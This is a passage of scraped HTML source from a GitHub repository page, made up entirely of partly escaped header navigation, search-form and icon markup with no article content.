aria-expanded=&quot;false&quot;&gt;        &lt;svg height=&quot;24&quot; class=&quot;octicon octicon-three-bars color-text-white&quot; viewBox=&quot;0 0 16 16&quot; version=&quot;1.1&quot; width=&quot;24&quot; aria-hidden=&quot;true&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M1 2.75A.75.75 0 011.75 2h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 2.75zm0 5A.75.75 0 011.75 7h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 7.75zM1.75 12a.75.75 0 100 1.5h12.5a.75.75 0 100-1.5H1.75z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;      &lt;/button&gt;    &lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;HeaderMenu HeaderMenu--logged-out position-fixed top-0 right-0 bottom-0 height-fit position-lg-relative d-lg-flex flex-justify-between flex-items-center flex-auto&quot;&gt;  &lt;div class=&quot;d-flex d-lg-none flex-justify-end border-bottom color-bg-secondary p-3&quot;&gt;    &lt;button class=&quot;btn-link js-details-target&quot; type=&quot;button&quot; aria-label=&quot;Toggle navigation&quot; aria-expanded=&quot;false&quot;&gt;      &lt;svg height=&quot;24&quot; class=&quot;octicon octicon-x color-text-secondary&quot; viewBox=&quot;0 0 24 24&quot; version=&quot;1.1&quot; width=&quot;24&quot; aria-hidden=&quot;true&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M5.72 5.72a.75.75 0 011.06 0L12 10.94l5.22-5.22a.75.75 0 111.06 1.06L13.06 12l5.22 5.22a.75.75 0 11-1.06 1.06L12 13.06l-5.22 5.22a.75.75 0 01-1.06-1.06L10.94 12 5.72 6.78a.75.75 0 010-1.06z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;    &lt;/button&gt;  &lt;/div&gt;    &lt;nav class=&quot;mt-0 px-3 px-lg-0 mb-5 mb-lg-0&quot; aria-label=&quot;Global&quot;&gt;      &lt;ul class=&quot;d-lg-flex list-style-none&quot;&gt;          &lt;li class=&quot;d-block d-lg-flex flex-lg-nowrap flex-lg-items-center border-bottom border-lg-bottom-0 mr-0 mr-lg-3 edge-item-fix position-relative flex-wrap flex-justify-between d-flex flex-items-center &quot;&gt;            &lt;details class=&quot;HeaderMenu-details details-overlay details-reset width-full&quot;&gt;              &lt;summary class=&quot;HeaderMenu-summary HeaderMenu-link px-0 py-3 border-0 no-wrap d-block d-lg-inline-block&quot;&gt;                Why GitHub?                &lt;svg x=&quot;0px&quot; y=&quot;0px&quot; viewBox=&quot;0 0 14 8&quot; xml:space=&quot;preserve&quot; fill=&quot;none&quot; class=&quot;icon-chevon-down-mktg position-absolute position-lg-relative&quot;&gt;                  &lt;path d=&quot;M1,1l6.2,6L13,1&quot;&gt;&lt;/path&gt;                &lt;/svg&gt;              &lt;/summary&gt;              &lt;div class=&quot;dropdown-menu flex-auto rounded px-0 mt-0 pb-4 p-lg-4 position-relative position-lg-absolute left-0 left-lg-n4&quot;&gt;                &lt;a href=&quot;/features&quot; class=&quot;py-2 lh-condensed-ultra d-block Link--primary no-underline h5 Bump-link--hover&quot; data-ga-click=&quot;(Logged out) Header, go to Features&quot;&gt;Features &lt;span class=&quot;Bump-link-symbol float-right text-normal color-text-tertiary pr-3&quot;&gt;&amp;rarr;&lt;/span&gt;&lt;/a&gt;                &lt;ul class=&quot;list-style-none f5 pb-3&quot;&gt;                    &lt;li class=&quot;edge-item-fix&quot;&gt;&lt;a href=&quot;/mobile&quot; class=&quot;py-2 lh-condensed-ultra d-block Link--secondary no-underline f5 Bump-link--hover&quot;&gt;Mobile &lt;span class=&quot;Bump-link-symbol float-right text-normal color-text-tertiary pr-3&quot;&gt;&amp;rarr;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;                    &lt;li class=&quot;edge-item-fix&quot;&gt;&lt;a href=&quot;/features/actions&quot; class=&quot;py-2 lh-condensed-ultra d-block Link--secondary no-underline f5 Bump-link--hover&quot;&gt;Actions &lt;span class=&quot;Bump-link-symbol float-right text-normal color-text-tertiary pr-3&quot;&gt;&amp;rarr;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;                    &lt;li class=&quot;edge-item-fix&quot;&gt;&lt;a href=&quot;/features/codespaces&quot; class=&quot;py-2 lh-condensed-ultra d-block Link--secondary no-underline f5 Bump-link--hover&quot;&gt;Codespaces &lt;span class=&quot;Bump-link-symbol float-right text-normal color-text-tertiary pr-3&quot;&gt;&amp;rarr;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;                    &lt;li class=&quot;edge-item-fix&quot;&gt;&lt;a href=&quot;/features/packages&quot; class=&quot;py-2 lh-condensed-ultra d-block Link--secondary no-underline f5 Bump-link--hover&quot;&gt;Packages &lt;span class=&quot;Bump-link-symbol float-right text-normal color-text-tertiary pr-3&quot;&gt;&amp;rarr;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;                    &lt;li class=&quot;edge-item-fix&quot;&gt;&lt;a href=&quot;/features/security&quot; class=&quot;py-2 lh-condensed-ultra d-block Link--secondary no-underline f5 Bump-link--hover&quot;&gt;Security &lt;span class=&quot;Bump-link-symbol float-right text-normal color-text-tertiary pr-3&quot;&gt;&amp;rarr;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;                    &lt;li class=&quot;edge-item-fix&quot;&gt;&lt;a href=&quot;/features/code-review/&quot; class=&quot;py-2 lh-condensed-ultra d-block Link--secondary no-underline f5 Bump-link--hover&quot;&gt;Code review &lt;span class=&quot;Bump-link-symbol float-right text-normal color-text-tertiary pr-3&quot;&gt;&amp;rarr;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;                    &lt;li class=&quot;edge-item-fix&quot;&gt;&lt;a href=&quot;/features/project-management/&quot; class=&quot;py-2 lh-condensed-ultra d-block Link--secondary no-underline f5 Bump-link--hover&quot;&gt;Project management &lt;span class=&quot;Bump-link-symbol float-right text-normal color-text-tertiary pr-3&quot;&gt;&amp;rarr;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;                    &lt;li class=&quot;edge-item-fix&quot;&gt;&lt;a href=&quot;/features/integrations&quot; class=&quot;py-2 lh-condensed-ultra d-block Link--secondary no-underline f5 Bump-link--hover&quot;&gt;Integrations &lt;span class=&quot;Bump-link-symbol float-right text-normal color-text-tertiary pr-3&quot;&gt;&amp;rarr;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;                &lt;/ul&gt;                &lt;ul class=&quot;list-style-none mb-0 border-lg-top pt-lg-3&quot;&gt;                  &lt;li class=&quot;edge-item-fix&quot;&gt;&lt;a href=&quot;/sponsors&quot; class=&quot;py-2 lh-condensed-ultra d-block no-underline Link--primary no-underline h5 Bump-link--hover&quot; data-ga-click=&quot;(Logged out) Header, go to Sponsors&quot;&gt;GitHub Sponsors &lt;span class=&quot;Bump-link-symbol float-right text-normal color-text-tertiary pr-3&quot;&gt;&amp;rarr;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;                  &lt;li class=&quot;edge-item-fix&quot;&gt;&lt;a href=&quot;/customer-stories&quot; class=&quot;py-2 lh-condensed-ultra d-block no-underline Link--primary no-underline h5 Bump-link--hover&quot; data-ga-click=&quot;(Logged out) Header, go to Customer stories&quot;&gt;Customer stories&lt;span class=&quot;Bump-link-symbol float-right text-normal color-text-tertiary pr-3&quot;&gt;&amp;rarr;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;                &lt;/ul&gt;              &lt;/div&gt;            &lt;/details&gt;          &lt;/li&gt;          &lt;li class=&quot;border-bottom border-lg-bottom-0 mr-0 mr-lg-3&quot;&gt;            &lt;a href=&quot;/team&quot; class=&quot;HeaderMenu-link no-underline py-3 d-block d-lg-inline-block&quot; data-ga-click=&quot;(Logged out) Header, go to Team&quot;&gt;Team&lt;/a&gt;          &lt;/li&gt;          &lt;li class=&quot;border-bottom border-lg-bottom-0 mr-0 mr-lg-3&quot;&gt;            &lt;a href=&quot;/enterprise&quot; class=&quot;HeaderMenu-link no-underline py-3 d-block d-lg-inline-block&quot; data-ga-click=&quot;(Logged out) Header, go to Enterprise&quot;&gt;Enterprise&lt;/a&gt;          &lt;/li&gt;          &lt;li class=&quot;d-block d-lg-flex flex-lg-nowrap flex-lg-items-center border-bottom border-lg-bottom-0 mr-0 mr-lg-3 edge-item-fix position-relative flex-wrap flex-justify-between d-flex flex-items-center &quot;&gt;            &lt;details class=&quot;HeaderMenu-details details-overlay details-reset width-full&quot;&gt;              &lt;summary class=&quot;HeaderMenu-summary HeaderMenu-link px-0 py-3 border-0 no-wrap d-block d-lg-inline-block&quot;&gt;                Explore                &lt;svg x=&quot;0px&quot; y=&quot;0px&quot; viewBox=&quot;0 0 14 8&quot; xml:space=&quot;preserve&quot; fill=&quot;none&quot; class=&quot;icon-chevon-down-mktg position-absolute position-lg-relative&quot;&gt;                  &lt;path d=&quot;M1,1l6.2,6L13,1&quot;&gt;&lt;/path&gt;                &lt;/svg&gt;              &lt;/summary&gt;              &lt;div class=&quot;dropdown-menu flex-auto rounded px-0 pt-2 pb-0 mt-0 pb-4 p-lg-4 position-relative position-lg-absolute left-0 left-lg-n4&quot;&gt;                &lt;ul class=&quot;list-style-none mb-3&quot;&gt;                  &lt;li class=&quot;edge-item-fix&quot;&gt;&lt;a href=&quot;/explore&quot; class=&quot;py-2 lh-condensed-ultra d-block Link--primary no-underline h5 Bump-link--hover&quot; data-ga-click=&quot;(Logged out) Header, go to Explore&quot;&gt;Explore GitHub &lt;span class=&quot;Bump-link-symbol float-right text-normal color-text-tertiary pr-3&quot;&gt;&amp;rarr;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;                &lt;/ul&gt;                &lt;h4 class=&quot;color-text-tertiary text-normal text-mono f5 mb-2 border-lg-top pt-lg-3&quot;&gt;Learn and contribute&lt;/h4&gt;                &lt;ul class=&quot;list-style-none mb-3&quot;&gt;                  &lt;li class=&quot;edge-item-fix&quot;&gt;&lt;a href=&quot;/topics&quot; class=&quot;py-2 lh-condensed-ultra d-block Link--secondary no-underline f5 Bump-link--hover&quot; data-ga-click=&quot;(Logged out) Header, go to Topics&quot;&gt;Topics &lt;span class=&quot;Bump-link-symbol float-right text-normal color-text-tertiary pr-3&quot;&gt;&amp;rarr;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;                    &lt;li class=&quot;edge-item-fix&quot;&gt;&lt;a href=&quot;/collections&quot; class=&quot;py-2 lh-condensed-ultra d-block Link--secondary no-underline f5 Bump-link--hover&quot; data-ga-click=&quot;(Logged out) Header, go to Collections&quot;&gt;Collections &lt;span class=&quot;Bump-link-symbol float-right text-normal color-text-tertiary pr-3&quot;&gt;&amp;rarr;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;                  &lt;li class=&quot;edge-item-fix&quot;&gt;&lt;a href=&quot;/trending&quot; class=&quot;py-2 lh-condensed-ultra d-block Link--secondary no-underline f5 Bump-link--hover&quot; data-ga-click=&quot;(Logged out) Header, go to Trending&quot;&gt;Trending &lt;span class=&quot;Bump-link-symbol float-right text-normal color-text-tertiary pr-3&quot;&gt;&amp;rarr;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;                  &lt;li class=&quot;edge-item-fix&quot;&gt;&lt;a href=&quot;https://lab.github.com/&quot; class=&quot;py-2 lh-condensed-ultra d-block Link--secondary no-underline f5 Bump-link--hover&quot; data-ga-click=&quot;(Logged out) Header, go to Learning lab&quot;&gt;Learning Lab &lt;span class=&quot;Bump-link-symbol float-right text-normal color-text-tertiary pr-3&quot;&gt;&amp;rarr;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;                  &lt;li class=&quot;edge-item-fix&quot;&gt;&lt;a href=&quot;https://opensource.guide&quot; class=&quot;py-2 lh-condensed-ultra d-block Link--secondary no-underline f5 Bump-link--hover&quot; data-ga-click=&quot;(Logged out) Header, go to Open source guides&quot;&gt;Open source guides &lt;span class=&quot;Bump-link-symbol float-right text-normal color-text-tertiary pr-3&quot;&gt;&amp;rarr;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;                &lt;/ul&gt;                &lt;h4 class=&quot;color-text-tertiary text-normal text-mono f5 mb-2 border-lg-top pt-lg-3&quot;&gt;Connect with others&lt;/h4&gt;                &lt;ul class=&quot;list-style-none mb-0&quot;&gt;                  &lt;li class=&quot;edge-item-fix&quot;&gt;&lt;a href=&quot;https://github.com/readme&quot; class=&quot;py-2 lh-condensed-ultra d-block Link--secondary no-underline f5 Bump-link--hover&quot;&gt;The ReadME Project &lt;span class=&quot;Bump-link-symbol float-right text-normal color-text-tertiary pr-3&quot;&gt;&amp;rarr;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;                  &lt;li class=&quot;edge-item-fix&quot;&gt;&lt;a href=&quot;https://github.com/events&quot; class=&quot;py-2 lh-condensed-ultra d-block Link--secondary no-underline f5 Bump-link--hover&quot; data-ga-click=&quot;(Logged out) Header, go to Events&quot;&gt;Events &lt;span class=&quot;Bump-link-symbol float-right text-normal color-text-tertiary pr-3&quot;&gt;&amp;rarr;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;                  &lt;li class=&quot;edge-item-fix&quot;&gt;&lt;a href=&quot;https://github.community&quot; class=&quot;py-2 lh-condensed-ultra d-block Link--secondary no-underline f5 Bump-link--hover&quot; data-ga-click=&quot;(Logged out) Header, go to Community forum&quot;&gt;Community forum &lt;span class=&quot;Bump-link-symbol float-right text-normal color-text-tertiary pr-3&quot;&gt;&amp;rarr;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;                  &lt;li class=&quot;edge-item-fix&quot;&gt;&lt;a href=&quot;https://education.github.com&quot; class=&quot;py-2 lh-condensed-ultra d-block Link--secondary no-underline f5 Bump-link--hover&quot; data-ga-click=&quot;(Logged out) Header, go to GitHub Education&quot;&gt;GitHub Education &lt;span class=&quot;Bump-link-symbol float-right text-normal color-text-tertiary pr-3&quot;&gt;&amp;rarr;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;                  &lt;li class=&quot;edge-item-fix&quot;&gt;&lt;a href=&quot;https://stars.github.com&quot; class=&quot;py-2 pb-0 lh-condensed-ultra d-block Link--secondary no-underline f5 Bump-link--hover&quot; data-ga-click=&quot;(Logged out) Header, go to GitHub Stars Program&quot;&gt;GitHub Stars program &lt;span class=&quot;Bump-link-symbol float-right text-normal color-text-tertiary pr-3&quot;&gt;&amp;rarr;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;                &lt;/ul&gt;              &lt;/div&gt;            &lt;/details&gt;          &lt;/li&gt;          &lt;li class=&quot;border-bottom border-lg-bottom-0 mr-0 mr-lg-3&quot;&gt;            &lt;a href=&quot;/marketplace&quot; class=&quot;HeaderMenu-link no-underline py-3 d-block d-lg-inline-block&quot; data-ga-click=&quot;(Logged out) Header, go to Marketplace&quot;&gt;Marketplace&lt;/a&gt;          &lt;/li&gt;          &lt;li class=&quot;d-block d-lg-flex flex-lg-nowrap flex-lg-items-center border-bottom border-lg-bottom-0 mr-0 mr-lg-3 edge-item-fix position-relative flex-wrap flex-justify-between d-flex flex-items-center &quot;&gt;            &lt;details class=&quot;HeaderMenu-details details-overlay details-reset width-full&quot;&gt;              &lt;summary class=&quot;HeaderMenu-summary HeaderMenu-link px-0 py-3 border-0 no-wrap d-block d-lg-inline-block&quot;&gt;                Pricing                &lt;svg x=&quot;0px&quot; y=&quot;0px&quot; viewBox=&quot;0 0 14 8&quot; xml:space=&quot;preserve&quot; fill=&quot;none&quot; class=&quot;icon-chevon-down-mktg position-absolute position-lg-relative&quot;&gt;                   &lt;path d=&quot;M1,1l6.2,6L13,1&quot;&gt;&lt;/path&gt;                &lt;/svg&gt;              &lt;/summary&gt;              &lt;div class=&quot;dropdown-menu flex-auto rounded px-0 pt-2 pb-4 mt-0 p-lg-4 position-relative position-lg-absolute left-0 left-lg-n4&quot;&gt;                &lt;a href=&quot;/pricing&quot; class=&quot;pb-2 lh-condensed-ultra d-block Link--primary no-underline h5 Bump-link--hover&quot; data-ga-click=&quot;(Logged out) Header, go to Pricing&quot;&gt;Plans &lt;span class=&quot;Bump-link-symbol float-right text-normal color-text-tertiary pr-3&quot;&gt;&amp;rarr;&lt;/span&gt;&lt;/a&gt;                &lt;ul class=&quot;list-style-none mb-3&quot;&gt;                  &lt;li class=&quot;edge-item-fix&quot;&gt;&lt;a href=&quot;/pricing#feature-comparison&quot; class=&quot;py-2 lh-condensed-ultra d-block Link--secondary no-underline f5 Bump-link--hover&quot; data-ga-click=&quot;(Logged out) Header, go to Compare plans&quot;&gt;Compare plans &lt;span class=&quot;Bump-link-symbol float-right text-normal color-text-tertiary pr-3&quot;&gt;&amp;rarr;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;                  &lt;li class=&quot;edge-item-fix&quot;&gt;&lt;a href=&quot;https://enterprise.github.com/contact&quot; class=&quot;py-2 lh-condensed-ultra d-block Link--secondary no-underline f5 Bump-link--hover&quot; data-ga-click=&quot;(Logged out) Header, go to Contact Sales&quot;&gt;Contact Sales &lt;span class=&quot;Bump-link-symbol float-right text-normal color-text-tertiary pr-3&quot;&gt;&amp;rarr;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;                &lt;/ul&gt;                &lt;ul class=&quot;list-style-none mb-0 border-lg-top pt-lg-3&quot;&gt;                  &lt;li class=&quot;edge-item-fix&quot;&gt;&lt;a href=&quot;/nonprofit&quot; class=&quot;py-2 lh-condensed-ultra d-block no-underline Link--primary no-underline h5 Bump-link--hover&quot; data-ga-click=&quot;(Logged out) Header, go to Nonprofits&quot;&gt;Nonprofit &lt;span class=&quot;Bump-link-symbol float-right text-normal color-text-tertiary pr-3&quot;&gt;&amp;rarr;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;                  &lt;li class=&quot;edge-item-fix&quot;&gt;&lt;a href=&quot;https://education.github.com&quot; class=&quot;py-2 pb-0 lh-condensed-ultra d-block no-underline Link--primary no-underline h5 Bump-link--hover&quot;  data-ga-click=&quot;(Logged out) Header, go to Education&quot;&gt;Education &lt;span class=&quot;Bump-link-symbol float-right text-normal color-text-tertiary pr-3&quot;&gt;&amp;rarr;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;                &lt;/ul&gt;              &lt;/div&gt;            &lt;/details&gt;          &lt;/li&gt;      &lt;/ul&gt;    &lt;/nav&gt;  &lt;div class=&quot;d-lg-flex flex-items-center px-3 px-lg-0 text-center text-lg-left&quot;&gt;      &lt;div class=&quot;d-lg-flex min-width-0 mb-3 mb-lg-0&quot;&gt;        &lt;div class=&quot;header-search flex-auto js-site-search position-relative flex-self-stretch flex-md-self-auto mb-3 mb-md-0 mr-0 mr-md-3 scoped-search site-scoped-search js-jump-to&quot;</code></pre><p>  role=”combobox”<br>  aria-owns=”jump-to-results”<br>  aria-label=”Search or jump to”<br>  aria-haspopup=”listbox”<br>  aria-expanded=”false”</p><blockquote></blockquote>  <div class="position-relative">    <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-site-search-form" role="search" aria-label="Site" data-scope-type="Repository" data-scope-id="333657172" data-scoped-search-url="/wjddnjs33/wjddnjs33.github.io/search" data-owner-scoped-search-url="/users/wjddnjs33/search" data-unscoped-search-url="/search" action="/wjddnjs33/wjddnjs33.github.io/search" accept-charset="UTF-8" method="get">      <label class="form-control input-sm header-search-wrapper p-0 js-chromeless-input-container header-search-wrapper-jump-to position-relative d-flex flex-justify-between flex-items-center">        <input type="text"          class="form-control input-sm header-search-input jump-to-field js-jump-to-field js-site-search-focus js-site-search-field is-clearable"          data-hotkey="s,/"          name="q"          value=""          placeholder="Search"          data-unscoped-placeholder="Search GitHub"          data-scoped-placeholder="Search"          autocapitalize="off"          aria-autocomplete="list"          aria-controls="jump-to-results"          aria-label="Search"          data-jump-to-suggestions-path="/_graphql/GetSuggestedNavigationDestinations"          spellcheck="false"          autocomplete="off"          >          <input type="hidden" data-csrf="true" class="js-data-jump-to-suggestions-path-csrf" value="7mG7Fc+Wg+xE021SXGM+xKGBV89jgBo/3J034WXZFSsrxLKSX3Jybv+h0wR6IigAMI1+5JCJ6lJcVYSNv1Bw8A==" />          <input type="hidden" class="js-site-search-type-field" name="type" >            <img src="https://github.githubassets.com/images/search-key-slash.svg" alt="" class="mr-2 header-search-key-slash"><pre><code>        &lt;div class=&quot;Box position-absolute overflow-hidden d-none jump-to-suggestions js-jump-to-suggestions-container&quot;&gt;          </code></pre><ul class="d-none js-jump-to-suggestions-template-container">  <li class="d-flex flex-justify-start flex-items-center p-0 f5 navigation-item js-navigation-item js-jump-to-suggestion" role="option">  <a tabindex="-1" class="no-underline d-flex flex-auto flex-items-center jump-to-suggestions-path js-jump-to-suggestion-path js-navigation-open p-2" href="" data-item-type="suggestion">    <div class="jump-to-octicon js-jump-to-octicon flex-shrink-0 mr-2 text-center d-none">      <svg height="16" width="16" class="octicon octicon-repo flex-shrink-0 js-jump-to-octicon-repo d-none" title="Repository" aria-label="Repository" viewBox="0 0 16 16" version="1.1" role="img"><path fill-rule="evenodd" d="M2 2.5A2.5 2.5 0 014.5 0h8.75a.75.75 0 01.75.75v12.5a.75.75 0 01-.75.75h-2.5a.75.75 0 110-1.5h1.75v-2h-8a1 1 0 00-.714 1.7.75.75 0 01-1.072 1.05A2.495 2.495 0 012 11.5v-9zm10.5-1V9h-8c-.356 0-.694.074-1 .208V2.5a1 1 0 011-1h8zM5 12.25v3.25a.25.25 0 00.4.2l1.45-1.087a.25.25 0 01.3 0L8.6 15.7a.25.25 0 00.4-.2v-3.25a.25.25 0 00-.25-.25h-3.5a.25.25 0 00-.25.25z"></path></svg>      <svg height="16" width="16" class="octicon octicon-project flex-shrink-0 js-jump-to-octicon-project d-none" title="Project" aria-label="Project" viewBox="0 0 16 16" version="1.1" role="img"><path fill-rule="evenodd" d="M1.75 0A1.75 1.75 0 000 1.75v12.5C0 15.216.784 16 1.75 16h12.5A1.75 1.75 0 0016 14.25V1.75A1.75 1.75 0 0014.25 0H1.75zM1.5 1.75a.25.25 0 01.25-.25h12.5a.25.25 0 01.25.25v12.5a.25.25 0 01-.25.25H1.75a.25.25 0 01-.25-.25V1.75zM11.75 3a.75.75 0 00-.75.75v7.5a.75.75 0 001.5 0v-7.5a.75.75 0 00-.75-.75zm-8.25.75a.75.75 0 011.5 0v5.5a.75.75 0 01-1.5 0v-5.5zM8 3a.75.75 0 00-.75.75v3.5a.75.75 0 001.5 0v-3.5A.75.75 0 008 3z"></path></svg>      <svg height="16" width="16" class="octicon octicon-search flex-shrink-0 js-jump-to-octicon-search d-none" title="Search" aria-label="Search" viewBox="0 0 16 16" version="1.1" role="img"><path fill-rule="evenodd" d="M11.5 7a4.499 4.499 0 11-8.998 0A4.499 4.499 0 0111.5 7zm-.82 4.74a6 6 0 111.06-1.06l3.04 3.04a.75.75 0 11-1.06 1.06l-3.04-3.04z"></path></svg>    </div><pre><code>&lt;img class=&quot;avatar mr-2 flex-shrink-0 js-jump-to-suggestion-avatar d-none&quot; alt=&quot;&quot; aria-label=&quot;Team&quot; src=&quot;&quot; width=&quot;28&quot; height=&quot;28&quot;&gt;&lt;div class=&quot;jump-to-suggestion-name js-jump-to-suggestion-name flex-auto overflow-hidden text-left no-wrap css-truncate css-truncate-target&quot;&gt;&lt;/div&gt;&lt;div class=&quot;border rounded-1 flex-shrink-0 color-bg-tertiary px-1 color-text-tertiary ml-1 f6 d-none js-jump-to-badge-search&quot;&gt;  &lt;span class=&quot;js-jump-to-badge-search-text-default d-none&quot; aria-label=&quot;in this repository&quot;&gt;    In this repository  &lt;/span&gt;  &lt;span class=&quot;js-jump-to-badge-search-text-global d-none&quot; aria-label=&quot;in all of GitHub&quot;&gt;    All GitHub  &lt;/span&gt;  &lt;span aria-hidden=&quot;true&quot; class=&quot;d-inline-block ml-1 v-align-middle&quot;&gt;↵&lt;/span&gt;&lt;/div&gt;&lt;div aria-hidden=&quot;true&quot; class=&quot;border rounded-1 flex-shrink-0 color-bg-tertiary px-1 color-text-tertiary ml-1 f6 d-none d-on-nav-focus js-jump-to-badge-jump&quot;&gt;  Jump to  &lt;span class=&quot;d-inline-block ml-1 v-align-middle&quot;&gt;↵&lt;/span&gt;&lt;/div&gt;</code></pre>  </a></li></ul><ul class="d-none js-jump-to-no-results-template-container">  <li class="d-flex flex-justify-center flex-items-center f5 d-none js-jump-to-suggestion p-2">    <span class="color-text-secondary">No suggested jump to results</span>  </li></ul><ul id="jump-to-results" role="listbox" class="p-0 m-0 js-navigation-container jump-to-suggestions-results-container js-jump-to-suggestions-results-container">  <li class="d-flex flex-justify-start flex-items-center p-0 f5 navigation-item js-navigation-item js-jump-to-scoped-search d-none" role="option">  <a tabindex="-1" class="no-underline d-flex flex-auto flex-items-center jump-to-suggestions-path js-jump-to-suggestion-path js-navigation-open p-2" href="" data-item-type="scoped_search">    <div class="jump-to-octicon js-jump-to-octicon flex-shrink-0 mr-2 text-center d-none">      <svg height="16" width="16" class="octicon octicon-repo flex-shrink-0 js-jump-to-octicon-repo d-none" title="Repository" aria-label="Repository" viewBox="0 0 16 16" version="1.1" role="img"><path fill-rule="evenodd" d="M2 2.5A2.5 2.5 0 014.5 0h8.75a.75.75 0 01.75.75v12.5a.75.75 0 01-.75.75h-2.5a.75.75 0 110-1.5h1.75v-2h-8a1 1 0 00-.714 1.7.75.75 0 01-1.072 1.05A2.495 2.495 0 012 11.5v-9zm10.5-1V9h-8c-.356 0-.694.074-1 .208V2.5a1 1 0 011-1h8zM5 12.25v3.25a.25.25 0 00.4.2l1.45-1.087a.25.25 0 01.3 0L8.6 15.7a.25.25 0 00.4-.2v-3.25a.25.25 0 00-.25-.25h-3.5a.25.25 0 00-.25.25z"></path></svg>      <svg height="16" width="16" class="octicon octicon-project flex-shrink-0 js-jump-to-octicon-project d-none" title="Project" aria-label="Project" viewBox="0 0 16 16" version="1.1" role="img"><path fill-rule="evenodd" d="M1.75 0A1.75 1.75 0 000 1.75v12.5C0 15.216.784 16 1.75 16h12.5A1.75 1.75 0 0016 14.25V1.75A1.75 1.75 0 0014.25 0H1.75zM1.5 1.75a.25.25 0 01.25-.25h12.5a.25.25 0 01.25.25v12.5a.25.25 0 01-.25.25H1.75a.25.25 0 01-.25-.25V1.75zM11.75 3a.75.75 0 00-.75.75v7.5a.75.75 0 001.5 0v-7.5a.75.75 0 00-.75-.75zm-8.25.75a.75.75 0 011.5 0v5.5a.75.75 0 01-1.5 0v-5.5zM8 3a.75.75 0 00-.75.75v3.5a.75.75 0 001.5 0v-3.5A.75.75 0 008 3z"></path></svg>      <svg height="16" width="16" class="octicon octicon-search flex-shrink-0 js-jump-to-octicon-search d-none" title="Search" aria-label="Search" viewBox="0 0 16 16" version="1.1" role="img"><path fill-rule="evenodd" d="M11.5 7a4.499 4.499 0 11-8.998 0A4.499 4.499 0 0111.5 7zm-.82 4.74a6 6 0 111.06-1.06l3.04 3.04a.75.75 0 11-1.06 1.06l-3.04-3.04z"></path></svg>    </div><pre><code>&lt;img class=&quot;avatar mr-2 flex-shrink-0 js-jump-to-suggestion-avatar d-none&quot; alt=&quot;&quot; aria-label=&quot;Team&quot; src=&quot;&quot; width=&quot;28&quot; height=&quot;28&quot;&gt;&lt;div class=&quot;jump-to-suggestion-name js-jump-to-suggestion-name flex-auto overflow-hidden text-left no-wrap css-truncate css-truncate-target&quot;&gt;&lt;/div&gt;&lt;div class=&quot;border rounded-1 flex-shrink-0 color-bg-tertiary px-1 color-text-tertiary ml-1 f6 d-none js-jump-to-badge-search&quot;&gt;  &lt;span class=&quot;js-jump-to-badge-search-text-default d-none&quot; aria-label=&quot;in this repository&quot;&gt;    In this repository  &lt;/span&gt;  &lt;span class=&quot;js-jump-to-badge-search-text-global d-none&quot; aria-label=&quot;in all of GitHub&quot;&gt;    All GitHub  &lt;/span&gt;  &lt;span aria-hidden=&quot;true&quot; class=&quot;d-inline-block ml-1 v-align-middle&quot;&gt;↵&lt;/span&gt;&lt;/div&gt;&lt;div aria-hidden=&quot;true&quot; class=&quot;border rounded-1 flex-shrink-0 color-bg-tertiary px-1 color-text-tertiary ml-1 f6 d-none d-on-nav-focus js-jump-to-badge-jump&quot;&gt;  Jump to  &lt;span class=&quot;d-inline-block ml-1 v-align-middle&quot;&gt;↵&lt;/span&gt;&lt;/div&gt;</code></pre>  </a></li><li class="d-flex flex-justify-start flex-items-center p-0 f5 navigation-item js-navigation-item js-jump-to-owner-scoped-search d-none" role="option">  <a tabindex="-1" class="no-underline d-flex flex-auto flex-items-center jump-to-suggestions-path js-jump-to-suggestion-path js-navigation-open p-2" href="" data-item-type="owner_scoped_search">    <div class="jump-to-octicon js-jump-to-octicon flex-shrink-0 mr-2 text-center d-none">      <svg height="16" width="16" class="octicon octicon-repo flex-shrink-0 js-jump-to-octicon-repo d-none" title="Repository" aria-label="Repository" viewBox="0 0 16 16" version="1.1" role="img"><path fill-rule="evenodd" d="M2 2.5A2.5 2.5 0 014.5 0h8.75a.75.75 0 01.75.75v12.5a.75.75 0 01-.75.75h-2.5a.75.75 0 110-1.5h1.75v-2h-8a1 1 0 00-.714 1.7.75.75 0 01-1.072 1.05A2.495 2.495 0 012 11.5v-9zm10.5-1V9h-8c-.356 0-.694.074-1 .208V2.5a1 1 0 011-1h8zM5 12.25v3.25a.25.25 0 00.4.2l1.45-1.087a.25.25 0 01.3 0L8.6 15.7a.25.25 0 00.4-.2v-3.25a.25.25 0 00-.25-.25h-3.5a.25.25 0 00-.25.25z"></path></svg>      <svg height="16" width="16" class="octicon octicon-project flex-shrink-0 js-jump-to-octicon-project d-none" title="Project" aria-label="Project" viewBox="0 0 16 16" version="1.1" role="img"><path fill-rule="evenodd" d="M1.75 0A1.75 1.75 0 000 1.75v12.5C0 15.216.784 16 1.75 